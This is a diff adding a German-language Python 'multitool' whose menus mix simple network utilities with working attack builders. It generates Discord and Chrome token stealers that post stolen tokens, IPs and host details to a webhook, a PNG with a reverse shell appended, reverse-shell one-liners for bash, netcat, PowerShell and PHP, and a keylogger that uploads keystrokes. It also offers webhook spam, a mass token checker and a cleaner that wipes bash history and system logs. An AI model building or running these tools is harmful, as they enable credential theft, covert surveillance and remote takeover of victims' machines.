@@ -1,0 +1,599 @@
+import os, sys, time, random, string, socket, subprocess, shutil, struct, zlib
+import json, base64, hashlib, threading, ipaddress, platform
+from datetime import datetime
+from pathlib import Path
+
+try:
+    import requests
+except ImportError:
+    subprocess.run([sys.executable, "-m", "pip", "install", "requests", "-q"])
+    import requests
+
+VERSION = "3.0"
+AUTHOR = "Xpluzo"
+SCAM_WEBHOOK = ""
+SCAM_LOG_WEBHOOK = ""
+
+R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
+M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; RS = "\033[0m"
+BOLD = "\033[1m"; DIM = "\033[2m"
+
+def clear(): os.system("clear")
+
+def print_banner():
+    clear()
+    print(f"""{C}╔═══════════════════════════════════════════════════════════════╗
+║  {Y}██╗  ██╗██████╗ ██╗     ██╗   ██╗███████╗ ██████╗{C}     ║
+║  {Y}╚██╗██╔╝██╔══██╗██║     ██║   ██║╚══███╔╝██╔═══██╗{C}    ║
+║  {Y} ╚███╔╝ ██████╔╝██║     ██║   ██║  ███╔╝ ██║   ██║{C}    ║
+║  {Y} ██╔██╗ ██╔═══╝ ██║     ██║   ██║ ███╔╝  ██║   ██║{C}    ║
+║  {Y}██╔╝ ██╗██║     ███████╗╚██████╔╝███████╗╚██████╔╝{C}    ║
+║  {Y}╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝{C}     ║
+║                                                               ║
+║  {W}MULTITOOL v{VERSION}{C}           {DIM}Author: {AUTHOR}{C}              ║
+╚═══════════════════════════════════════════════════════════════╝{RS}""")
+
+def header(title):
+    w = shutil.get_terminal_size().columns
+    print(f"\n{C}{'='*w}{RS}\n{Y}{BOLD}  {title}{RS}\n{C}{'='*w}{RS}\n")
+
+def footer():
+    print(f"\n{C}{'-'*60}{RS}")
+    print(f"{DIM}  [Enter] Weiter | [q] Hauptmenu | [Strg+C] Ende{RS}")
+    if input().strip().lower() == "q": return True
+    return False
+
+def get_input(prompt, default=""):
+    try:
+        val = input(f"  {Y}>>{RS} {B}{prompt}{RS} ").strip()
+        return val if val else default
+    except: return ""
+
+def show_output(lines):
+    w = shutil.get_terminal_size().columns
+    h = shutil.get_terminal_size().lines
+    max_l = h - 8
+    if len(lines) <= max_l:
+        for line in lines:
+            if line.startswith("[+]"): print(f"  {G}[+]{RS} {line[3:]}")
+            elif line.startswith("[-]"): print(f"  {R}[-]{RS} {line[3:]}")
+            elif line.startswith("[*]"): print(f"  {C}[*]{RS} {line[3:]}")
+            elif line.startswith("[!]"): print(f"  {Y}[!]{RS} {line[3:]}")
+            else: print(f"  {line}")
+        return
+    offset = 0
+    while True:
+        clear()
+        print(f"{M}{BOLD}=== AUSGABE (Scroll) ==={RS}\n")
+        for line in lines[offset:offset+max_l]:
+            if line.startswith("[+]"): print(f"  {G}[+]{RS} {line[3:]}")
+            elif line.startswith("[-]"): print(f"  {R}[-]{RS} {line[3:]}")
+            elif line.startswith("[*]"): print(f"  {C}[*]{RS} {line[3:]}")
+            elif line.startswith("[!]"): print(f"  {Y}[!]{RS} {line[3:]}")
+            else: print(f"  {line}")
+        print(f"\n{DIM}  [{offset+1}-{min(offset+max_l,len(lines))}/{len(lines)}] Enter=weiter q=zurueck b=zurueck{RS}")
+        c = input().strip().lower()
+        if c == "q": break
+        elif c == "b": offset = max(0, offset-max_l)
+        elif not c and offset+max_l < len(lines): offset += max_l
+        else: break
+
+# ===== SEITE 1 =====
+def s1_ip():
+    l = ["[*] IP GRABBER..."]
+    try:
+        hn = socket.gethostname()
+        l.append("[+] Hostname: " + hn); l.append("[+] Lokal: " + socket.gethostbyname(hn))
+    except: l.append("[-] Keine lokale IP")
+    try:
+        r = requests.get("https://api.ipify.org?format=json", timeout=5)
+        p = r.json()["ip"]; l.append("[+] Public: " + p)
+        r2 = requests.get(f"https://ipinfo.io/{p}/json", timeout=5)
+        d = r2.json(); l.append("[+] Ort: " + str(d.get('city','?')) + ", " + str(d.get('country','?')))
+        l.append("[+] ISP: " + str(d.get('org','?')))
+    except: l.append("[-] Kein externer Dienst")
+    return l
+
+def s1_dns():
+    l = []; t = get_input("Domain:")
+    if not t: return ["[-] Abbruch"]
+    l.append("[*] DNS fuer: " + t)
+    try: l.append("[+] IPv4: " + socket.gethostbyname(t))
+    except: l.append("[-] Keine IPv4")
+    try:
+        r = requests.get(f"https://who-dat.as93.net/{t}", timeout=5)
+        if r.status_code == 200:
+            for k,v in r.json().items(): l.append(f"  {k}: {v}")
+    except: l.append("[-] Kein WHOIS")
+    return l
+
+def s1_port():
+    l = []; t = get_input("Ziel:")
+    if not t: return ["[-] Abbruch"]
+    m = get_input("Modus [s]chnell(25) [a]lle(1000) [c]ustom:", "s")
+    ports = [21,22,23,25,53,80,110,139,143,443,445,993,1433,3306,3389,5432,5900,6379,8080,8443,27017,22,3389]
+    if m == "a": ports = range(1,1001)
+    elif m == "c":
+        p = get_input("Ports (22,80,443):")
+        try:
+            if "-" in p: a,b=map(int,p.split("-")); ports=range(a,b+1)
+            else: ports=[int(x.strip()) for x in p.split(",")]
+        except: return ["[-] Falsche Ports"]
+    try:
+        ip = socket.gethostbyname(t); l.append(f"[*] Scanne {ip} mit {len(ports)} Ports...")
+        for p in ports:
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(0.3)
+            if s.connect_ex((ip,p))==0:
+                try: svc=socket.getservbyport(p)
+                except: svc="?"
+                l.append(f"[+] Port {p:5d} -> {svc}")
+            s.close()
+    except Exception as e: l.append("[-] " + str(e))
+    return l
+
+def s1_sub():
+    l = []; d = get_input("Domain:")
+    if not d: return ["[-] Abbruch"]
+    w = get_input("Worter (komma):", "www,mail,admin,api,ftp,ssh,dev,test,blog")
+    for wd in w.split(","):
+        wd=wd.strip(); sub=wd+"."+d
+        try: socket.gethostbyname(sub); l.append("[+] " + sub)
+        except: pass
+    if len(l)==1: l.append("[-] Nichts gefunden")
+    return l
+
+def s1_http():
+    l = []; u = get_input("URL:")
+    if not u: return ["[-] Abbruch"]
+    try:
+        r = requests.get(u, timeout=10); l.append(f"[+] Status: {r.status_code} {r.reason}")
+        l.append(f"[+] Server: {r.headers.get('Server','?')}")
+        for k,v in r.headers.items(): l.append(f"  {k}: {v}")
+    except Exception as e: l.append("[-] " + str(e))
+    return l
+
+def s1_email():
+    l = []; e = get_input("Email:")
+    if not e: return ["[-] Abbruch"]
+    if '@' in e: l.append("[*] Domain: " + e.split('@')[1])
+    try:
+        h=hashlib.sha1(e.encode()).hexdigest().upper()
+        r=requests.get(f"https://api.pwnedpasswords.com/range/{h[:5]}", timeout=5)
+        if r.status_code==200:
+            for line in r.text.splitlines():
+                if line.startswith(h[5:]):
+                    l.append("[!] In " + line.split(":")[1] + " Leaks!"); break
+            else: l.append("[+] Keine Leaks")
+    except: l.append("[-] HIBP nicht erreichbar")
+    return l
+
+def s1_geo():
+    l = []; i = get_input("IP:")
+    if not i: return ["[-] Abbruch"]
+    try:
+        r=requests.get(f"https://ipinfo.io/{i}/json", timeout=5)
+        if r.status_code==200:
+            for k,v in r.json().items(): l.append(f"  {k}: {v}")
+    except: l.append("[-] Fehler")
+    return l
+
+# ===== SEITE 2 =====
+def s2_virus():
+    l = []
+    print(f"\n{M}{BOLD}=== VIRUSBILD / BILD-SCAM ==={RS}")
+    print("  [1] Payload an Bild haengen")
+    print("  [2] Reverse-Shell als Bild (Lin Khin)")
+    print("  [3] Discord-Bild-Scammer (Webhook+Logger)")
+    print("  [4] Zurueck")
+    ch = get_input("Auswahl:")
+    if ch == "3":
+        global SCAM_WEBHOOK, SCAM_LOG_WEBHOOK
+        wh = get_input("Webhook (Bild):", SCAM_WEBHOOK)
+        if not wh: return ["[-] Kein Webhook"]
+        SCAM_WEBHOOK = wh
+        lw = get_input("Webhook (Logs):", SCAM_LOG_WEBHOOK or wh)
+        SCAM_LOG_WEBHOOK = lw
+        name = get_input("Name (z.B. Lin Khin):", "Lin Khin")
+        out = get_input("Ausgabe:", "xpluzo_scammer.py")
+        bot = get_input("Bot-Name:", "Xpluzo")
+
+        code = f'''#!/usr/bin/env python3
+import os,sys,json,base64,socket,platform,requests,subprocess,time,uuid,re
+from datetime import datetime
+WH="{wh}"; LW="{lw}"; NAME="{name}"; BOT="{bot}"
+
+def get_ip():
+    try: return requests.get("https://ipinfo.io/json",timeout=5).json()
+    except: return {{"ip":"Unknown"}}
+
+def get_sys():
+    return {{"host":platform.node(),"os":platform.system()+" "+platform.release(),"user":os.environ.get("USER","?"),"time":str(datetime.now())}}
+
+def get_tokens():
+    t=[]; paths=["~/.config/discord/Local Storage/leveldb/","~/.config/discordcanary/Local Storage/leveldb/","~/.config/google-chrome/Default/Local Storage/leveldb/"]
+    for p in paths:
+        p=os.path.expanduser(p)
+        if os.path.exists(p):
+            for f in os.listdir(p):
+                if f.endswith((".log",".ldb")):
+                    try:
+                        with open(os.path.join(p,f),"r",errors="ignore") as fh:
+                            for t2 in re.findall(r"[\\w-]+\\.[\\w-]+\\.[\\w-]+",fh.read()):
+                                if t2 not in t and len(t2)>50: t.append(t2)
+                    except: pass
+    return t[:5]
+
+ip=get_ip(); sys=get_sys(); tokens=get_tokens()
+embed={{"title":"📸 "+NAME+" hat geklickt!","color":0x00ff00,
+"fields":[{{"name":"IP","value":ip.get("ip","?"),"inline":True}},
+{{"name":"Host","value":sys["host"],"inline":True}},
+{{"name":"User","value":sys["user"],"inline":True}},
+{{"name":"OS","value":sys["os"],"inline":True}},
+{{"name":"Standort","value":str(ip.get("city","?"))+", "+str(ip.get("country","?"))}},
+{{"name":"Tokens","value":"\\n".join(tokens) if tokens else "Keine"}}],
+"footer":{{"text":"Xpluzo v{VERSION} | "+sys["time"]}}}}
+try:
+    r=requests.post(WH,json={{"username":BOT,"embeds":[embed]}})
+    if LW and LW!=WH:
+        requests.post(LW,json={{"content":"✅ "+sys["host"]+" hat zugeschlagen! IP: "+ip.get("ip","?")}})
+    print("[+] Gesendet!" if r.status_code in [200,204] else f"[-] Fehler: {{r.status_code}}")
+except: print("[-] Kein Internet")
+'''
+        with open(out,"w") as f: f.write(code)
+        os.chmod(out,0o755)
+        l.append(f"[+] Bild-Scammer erstellt: {out}")
+        l.append(f"[+] Webhook: {wh[:40]}...")
+        l.append("[*] Auf Ziel ausfuehren: python3 " + out)
+        return l
+
+    elif ch == "2":
+        lh=get_input("LHOST:"); lp=get_input("LPORT:"); out=get_input("Ausgabe:", "lin_khin.png")
+        sc='#!/usr/bin/env python3\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("'+lh+'",'+lp+'))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/bash","-i"])\n'
+        png = b'\x89PNG\r\n\x1a\n'
+        def cht(t,d): crc=struct.pack(">I",zlib.crc32(t+d)&0xffffffff); return struct.pack(">I",len(d))+t+d+crc
+        png += cht(b'IHDR', struct.pack(">IIBBBBB",256,256,8,2,0,0,0))
+        raw = b'\x00' + bytes([random.randint(0,255) for _ in range(256*256*3)])
+        png += cht(b'IDAT', zlib.compress(raw))
+        png += cht(b'IEND', b'')
+        png += b'\n/*XPLUZO*/\n' + sc.encode()
+        with open(out,"wb") as f: f.write(png)
+        l.append(f"[+] Bild erstellt: {out} (256x256 PNG + Payload)")
+        l.append(f"[+] nc -lvnp {lp}")
+        return l
+    
+    elif ch == "1":
+        pay=get_input("Payload-Datei:"); bild=get_input("Bild-Datei:"); out=get_input("Ausgabe:")
+        if not pay or not bild or not out: return ["[-] Abbruch"]
+        with open(pay,"rb") as f: pd=f.read()
+        with open(bild,"rb") as f: bd=f.read()
+        with open(out,"wb") as f:
+            f.write(bd); f.write(b'\n/*XPLUZO_START*/\n'); f.write(pd); f.write(b'\n/*XPLUZO_END*/\n')
+        l.append(f"[+] Erstellt: {out} ({len(bd)}+{len(pd)} Bytes)")
+    return l
+
+def s2_shell():
+    l = []; print("  [1] Python [2] Bash [3] NC [4] PS [5] PHP [6] Alle")
+    ch = get_input("Auswahl:"); lh=get_input("LHOST:"); lp=get_input("LPORT:")
+    if not lh or not lp: return ["[-] Abbruch"]
+    p = {
+        "Python": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lh}",{lp}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
+        "Bash": f'bash -i >& /dev/tcp/{lh}/{lp} 0>&1',
+        "Netcat": f'nc -e /bin/bash {lh} {lp}',
+        "PowerShell": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{lh}\',{lp});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
+        "PHP": f'<?php $sock=fsockopen("{lh}",{lp});exec("/bin/bash -i <&3 >&3 2>&3");?>'
+    }
+    names = {"1":"Python","2":"Bash","3":"Netcat","4":"PowerShell","5":"PHP"}
+    if ch == "6":
+        for n,c in p.items(): l.append(f"  [{n}]:\n    {c}\n")
+    elif ch in names:
+        l.append(f"  [{names[ch]}]:\n    {p[names[ch]]}")
+    l.append(f"\n[*] nc -lvnp {lp}")
+    return l
+
+def s2_key():
+    l = []; out = get_input("Ausgabe:", "xpluzo_keylogger.py")
+    wh = get_input("Webhook (oder leer):")
+    code = f'''#!/usr/bin/env python3
+import keyboard,requests,threading,time,platform
+from datetime import datetime
+log=""; WH="{wh}"
+def on(e):
+    global log
+    try:
+        if e.name:
+            if len(e.name)==1: log+=e.name
+            elif e.name=="space": log+=" "
+            elif e.name=="enter": log+="\\n"
+            elif e.name=="backspace": log=log[:-1]
+            else: log+=f"[{{e.name}}]"
+    except: pass
+def send():
+    global log
+    while True:
+        time.sleep(60)
+        if log:
+'''
+    if wh: code += f'            try: r=requests.post(WH,json={{"content":f"```\\n{{log}}\\n```\\n**{{platform.node()}}**"}}); log="" if r.status_code in [200,204] else None\n            except: pass\n'
+    else: code += '            with open(f"log_{platform.node()}.txt","a") as f: f.write(f"[{datetime.now()}]\\n{log}\\n\\n"); log=""\n'
+    code += 'keyboard.on_press(on)\nt=threading.Thread(target=send,daemon=True);t.start()\nprint("[+] Keylogger aktiv. ESC=Ende")\nkeyboard.wait("esc")\n'
+    with open(out,"w") as f: f.write(code); os.chmod(out,0o755)
+    l.append(f"[+] {out} erstellt"); return l
+
+def s2_pass():
+    l = []; length = int(get_input("Laenge:", "20") or 20)
+    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
+    l.append("[+] " + ''.join(random.choice(chars) for _ in range(length)))
+    return l
+
+def s2_nmap():
+    l = []; t = get_input("Ziel:"); f = get_input("Flags:", "-sV -sC -T4")
+    try: r = subprocess.run(["nmap"]+f.split()+[t], capture_output=True, text=True, timeout=300)
+    except: l.append("[-] nmap Fehler")
+    else:
+        for line in (r.stdout+r.stderr).split("\n"):
+            if line.strip(): l.append(line)
+    return l
+
+# ===== SEITE 3 =====
+def s3_token_check():
+    l = []; t = get_input("Token:")
+    if not t: return ["[-] Abbruch"]
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization":t})
+        if r.status_code==200:
+            d=r.json(); l.append("[+] GUELTIG!")
+            l.append(f"[*] User: {d.get('username','?')}#{d.get('discriminator','0')}")
+            l.append(f"[*] ID: {d.get('id','?')}"); l.append(f"[*] Email: {d.get('email','?')}")
+            l.append(f"[*] MFA: {d.get('mfa_enabled')}")
+        else: l.append(f"[-] Ungueltig ({r.status_code})")
+    except Exception as e: l.append("[-] " + str(e))
+    return l
+
+def s3_token_info():
+    l = []; t = get_input("Token:")
+    if not t: return ["[-] Abbruch"]
+    parts = t.split(".")
+    if len(parts)==3:
+        try: l.append("[+] User-ID: " + base64.b64decode(parts[0]+"==").decode())
+        except: pass
+        l.append(f"[*] Laenge: {len(t)}")
+    return l
+
+def s3_nitro():
+    l = []; c = min(int(get_input("Anzahl:","10") or 10), 100)
+    for _ in range(c): l.append("  https://discord.gift/" + ''.join(random.choices(string.ascii_letters+string.digits,k=16)))
+    return l
+
+def s3_user():
+    l = []; p = get_input("Prefix:"); c = int(get_input("Anzahl:","15") or 15)
+    a=["Cyber","Dark","Neon","Xpluzo","Phantom","Ghost","Void","Nova","Storm"]
+    n=["Hacker","Agent","Knight","Core","Byte","Wolf","Raven","Eagle","Viper"]
+    for _ in range(c): l.append("  " + (p+random.choice(a)+random.choice(n)+str(random.randint(1,9999))))
+    return l
+
+def s3_webhook():
+    l = []; wh = get_input("Webhook:"); msg = get_input("Nachricht:","@everyone XPLUZO")
+    c = int(get_input("Anzahl:","20") or 20); d = float(get_input("Delay:","0.3") or 0.3)
+    for i in range(c):
+        try:
+            r = requests.post(wh, json={"content":f"{msg} [{i+1}/{c}]"})
+            l.append(f"  [{i+1}] {r.status_code}"); time.sleep(d)
+        except: l.append(f"  [{i+1}] Fehler")
+    return l
+
+def s3_grabber():
+    l = []; wh = get_input("Webhook:"); out = get_input("Ausgabe:", "grabber.py")
+    if not wh: return ["[-] Abbruch"]
+    code = f'''#!/usr/bin/env python3
+import os,re,requests,platform; WH="{wh}"
+tokens=[]; paths=["~/.config/discord/Local Storage/leveldb/","~/.config/discordcanary/Local Storage/leveldb/","~/.config/google-chrome/Default/Local Storage/leveldb/"]
+for p in paths:
+    p=os.path.expanduser(p)
+    if os.path.exists(p):
+        for f in os.listdir(p):
+            if f.endswith((".log",".ldb")):
+                try:
+                    with open(os.path.join(p,f),"r",errors="ignore") as fh:
+                        for t in re.findall(r"[\\w-]+\\.[\\w-]+\\.[\\w-]+",fh.read()):
+                            if t not in tokens and len(t)>50: tokens.append(t)
+                except: pass
+ip="?"
+try: ip=requests.get("https://api.ipify.org?format=json",timeout=5).json()["ip"]
+except: pass
+data={{"content":f"**XPLUZO**\\n{{platform.node()}}\\nIP: {{ip}}\\nTokens: {{chr(10).join(tokens[:5])}}"}}
+requests.post(WH,json=data)
+'''
+    with open(out,"w") as f: f.write(code); os.chmod(out,0o755)
+    l.append(f"[+] {out} erstellt"); return l
+
+# ===== SEITE 4 =====
+def s4_url():
+    l = []; u = get_input("URL:")
+    if not u: return ["[-] Abbruch"]
+    try: r=requests.get(f"https://tinyurl.com/api-create.php?url={u}",timeout=5); l.append(f"[+] {r.text.strip()}")
+    except: l.append("[-] Kein Shortener")
+    return l
+
+def s4_mac():
+    l = []; p = get_input("Prefix:"); c = int(get_input("Anzahl:","10") or 10)
+    for _ in range(c):
+        m=p.split(":")[:3] if p else [f"{random.randint(0,255):02x}" for _ in range(3)]
+        while len(m)<6: m.append(f"{random.randint(0,255):02x}")
+        l.append("  "+":".join(m[:6]).upper())
+    return l
+
+def s4_hash():
+    l = []; t = get_input("Text:")
+    if not t: return ["[-] Abbruch"]
+    l.append("[*] MD5: " + hashlib.md5(t.encode()).hexdigest())
+    l.append("[*] SHA256: " + hashlib.sha256(t.encode()).hexdigest())
+    return l
+
+def s4_b64():
+    l = []; print("  [1] Encode [2] Decode"); ch = get_input(":"); t = get_input("Text:")
+    if not t: return ["[-] Abbruch"]
+    try:
+        if ch=="1": l.append("[+] " + base64.b64encode(t.encode()).decode())
+        else: l.append("[+] " + base64.b64decode(t).decode())
+    except Exception as e: l.append("[-] " + str(e))
+    return l
+
+def s4_ipcalc():
+    l = []; c = get_input("CIDR (192.168.1.0/24):")
+    if not c: return ["[-] Abbruch"]
+    try:
+        n=ipaddress.ip_network(c,strict=False); l.append(f"[*] Netz: {n.network_address}")
+        l.append(f"[*] Broadcast: {n.broadcast_address}"); l.append(f"[*] Hosts: {n.num_addresses}")
+    except Exception as e: l.append("[-] " + str(e))
+    return l
+
+def s4_ua():
+    l = []; c = int(get_input("Anzahl:","5") or 5)
+    uas=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0","Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0","Mozilla/5.0 (iPhone) Mobile/15E148","curl/8.4.0"]
+    for _ in range(c): l.append("  " + random.choice(uas))
+    return l
+
+def s4_qr():
+    l = []; d = get_input("Daten:"); out = get_input("Ausgabe:","qr.png")
+    if not d: return ["[-] Abbruch"]
+    try:
+        import qrcode; qrcode.make(d).save(out); l.append(f"[+] QR: {out}")
+    except: l.append("[-] pip install qrcode[pil]")
+    return l
+
+# ===== SEITE 5 =====
+def s5_sys():
+    l = [f"[*] System: {platform.system()} {platform.release()}"]
+    l.append(f"[*] Hostname: {platform.node()}"); l.append(f"[*] Python: {platform.python_version()}")
+    try: l.append("[*] RAM: " + os.popen("free -h|grep Mem").read().split()[1])
+    except: pass
+    return l
+
+def s5_about():
+    return ["XPLUZO MULTITOOL v" + VERSION, "Author: " + AUTHOR, "Nur fuer autorisierte Tests!", "", "Features:", "  1: IP,DNS,Port,Subdomain,HTTP,Email,GeoIP", "  2: Virusbild,Shells,Keylogger,Passwort,nmap", "  3: Discord Token,Nitro,Username,Webhook,Grabber", "  4: URL,MAC,Hash,Base64,IPCalc,UA,QR", "  5: System,About"]
+
+def s5_update():
+    return [f"[*] Version: v{VERSION}", "[*] github.com/Xpluzo/Xpluzo-Multitool"]
+
+# ===== SEITE 6 =====
+def s6_mass_token():
+    l=[]; fp=get_input("Datei:")
+    if not fp: return ["[-] Abbruch"]
+    try:
+        with open(fp) as f: tokens=[t.strip() for t in f if t.strip()]
+        l.append(f"[*] {len(tokens)} Token(s)")
+        for i,t in enumerate(tokens[:20]):
+            try:
+                r=requests.get("https://discord.com/api/v9/users/@me",headers={"Authorization":t},timeout=5)
+                if r.status_code==200: l.append(f"  [{i+1}] GUELTIG: {r.json().get('username','?')}")
+                else: l.append(f"  [{i+1}] Ungueltig ({r.status_code})")
+            except: l.append(f"  [{i+1}] Fehler")
+    except: l.append("[-] Datei nicht gefunden")
+    return l
+
+def s6_auto_scan():
+    l=[]; t=get_input("Ziel:")
+    if not t: return ["[-] Abbruch"]
+    try:
+        ip=socket.gethostbyname(t); l.append(f"[*] Scanne {ip}")
+        ports=[21,22,23,25,53,80,110,139,143,443,445,993,3306,3389,5432,5900,6379,8080,8443,27017]
+        for p in ports:
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(0.3)
+            if s.connect_ex((ip,p))==0:
+                try: svc=socket.getservbyport(p)
+                except: svc="?"
+                l.append(f"  [OPEN] {p:5d} -> {svc}")
+            s.close()
+    except Exception as e: l.append("[-] "+str(e))
+    return l
+
+def s6_sub_http():
+    l=[]; d=get_input("Domain:")or"example.com"
+    ws=get_input("Worter:")or"www,mail,admin,api"
+    for w in ws.split(","):
+        w=w.strip(); sub=w+"."+d
+        try:
+            ip=socket.gethostbyname(sub)
+            try:
+                r=requests.get(f"http://{sub}",timeout=3,allow_redirects=False)
+                l.append(f"[OK] {sub} HTTP {r.status_code}")
+            except: l.append(f"[IP] {sub} {ip}")
+        except: pass
+    return l
+
+def s6_range_scan():
+    l=[]; cidr=get_input("CIDR:"); ps=get_input("Ports (22,80):","80,443")
+    if not cidr: return ["[-] Abbruch"]
+    try:
+        ports=[int(p.strip()) for p in ps.split(",")]; net=ipaddress.ip_network(cidr,strict=False)
+        for h in net.hosts():
+            hs=str(h)
+            for p in ports:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(0.2)
+                if s.connect_ex((hs,p))==0: l.append(f"[OPEN] {hs}:{p}")
+                s.close()
+    except Exception as e: l.append("[-] "+str(e))
+    return l
+
+def s6_log_clean():
+    l=[]
+    print("  [1] Bash History [2] Journal (sudo) [3] Python Cache")
+    ch=get_input(":")
+    if ch=="1": os.system("cat /dev/null > ~/.bash_history 2>/dev/null"); l.append("[+] History geloescht")
+    elif ch=="2":
+        try: subprocess.run(["sudo","journalctl","--vacuum-time=1s"],capture_output=True,timeout=10); l.append("[+] Journal geloescht")
+        except: l.append("[-] sudo?")
+    elif ch=="3":
+        c=0
+        for r,d,f in os.walk("."):
+            if "__pycache__" in d: shutil.rmtree(os.path.join(r,"__pycache__"),ignore_errors=True); c+=1
+        l.append(f"[+] {c} Ordner")
+    return l
+
+# ===== MENUS =====
+def run_tools(tools_dict, fun_map, title):
+    while True:
+        print_banner(); header(title)
+        for k,v in tools_dict.items(): print(f"  [{k}] {v}")
+        print("  [q] Zurueck")
+        ch = get_input(":")
+        if ch == "q": break
+        if ch in fun_map:
+            print_banner(); header(title + " > " + tools_dict[ch])
+            result = fun_map[ch]()
+            show_output(result)
+            if footer(): break
+
+def main():
+    try:
+        while True:
+            print_banner()
+            print(f"{C}{'='*60}{RS}")
+            print(f"{Y}{BOLD}  XPLUZO MULTITOOL v{VERSION} - HAUPTMENU{RS}")
+            print(f"{C}{'='*60}{RS}")
+            print(f"  {W}[1]{RS} Standard Tools (IP,DNS,Port,Subdomain,HTTP,Email,GeoIP)")
+            print(f"  {W}[2]{RS} Fortgeschrittene (Virusbild,Shells,Keylogger)")  
+            print(f"  {W}[3]{RS} Discord Tools (Token,Nitro,Webhook,Grabber)")
+            print(f"  {W}[4]{RS} Extra Tools (URL,MAC,Hash,Base64,IPCalc,UA,QR)")
+            print(f"  {W}[5]{RS} System & Info")
+            print(f"  {W}[6]{RS} Automatisierung (Mass-Token,Scan,LogClean)")
+            print(f"  {W}[q]{RS} Beenden")
+            print(f"{C}{'-'*60}{RS}")
+            
+            ch = get_input(":")
+            
+            if ch == "q": break
+            elif ch == "1": run_tools({"1":"IP Grabber","2":"DNS Lookup","3":"Port Scanner","4":"Subdomain","5":"HTTP Header","6":"Email OSINT","7":"GeoIP"}, {"1":s1_ip,"2":s1_dns,"3":s1_port,"4":s1_sub,"5":s1_http,"6":s1_email,"7":s1_geo}, "SEITE 1")
+            elif ch == "2": run_tools({"1":"Virusbild/Scammer","2":"Reverse Shell","3":"Keylogger","4":"Passwort","5":"nmap"}, {"1":s2_virus,"2":s2_shell,"3":s2_key,"4":s2_pass,"5":s2_nmap}, "SEITE 2")
+            elif ch == "3": run_tools({"1":"Token Checker","2":"Token Info","3":"Nitro Gen","4":"Username Gen","5":"Webhook Spam","6":"Grabber Gen"}, {"1":s3_token_check,"2":s3_token_info,"3":s3_nitro,"4":s3_user,"5":s3_webhook,"6":s3_grabber}, "SEITE 3")
+            elif ch == "4": run_tools({"1":"URL Shortener","2":"MAC Gen","3":"Hash","4":"Base64","5":"IP Calc","6":"User-Agent","7":"QR Code"}, {"1":s4_url,"2":s4_mac,"3":s4_hash,"4":s4_b64,"5":s4_ipcalc,"6":s4_ua,"7":s4_qr}, "SEITE 4")
+            elif ch == "5": run_tools({"1":"System Info","2":"About","3":"Update"}, {"1":s5_sys,"2":s5_about,"3":s5_update}, "SEITE 5")
+            elif ch == "6": run_tools({"1":"Mass Token Check","2":"Auto Port Scan","3":"Subdomain+HTTP","4":"Range+Port Scan","5":"Log Cleaner"}, {"1":s6_mass_token,"2":s6_auto_scan,"3":s6_sub_http,"4":s6_range_scan,"5":s6_log_clean}, "SEITE 6")
+    except KeyboardInterrupt: pass
+    finally:
+        clear()
+        print(f"\n{G}XPLUZO MULTITOOL v{VERSION} beendet.{RS}")
+        print(f"{G}Happy Hacking! - {AUTHOR}{RS}\n")
+
+if __name__ == "__main__":
+    main()
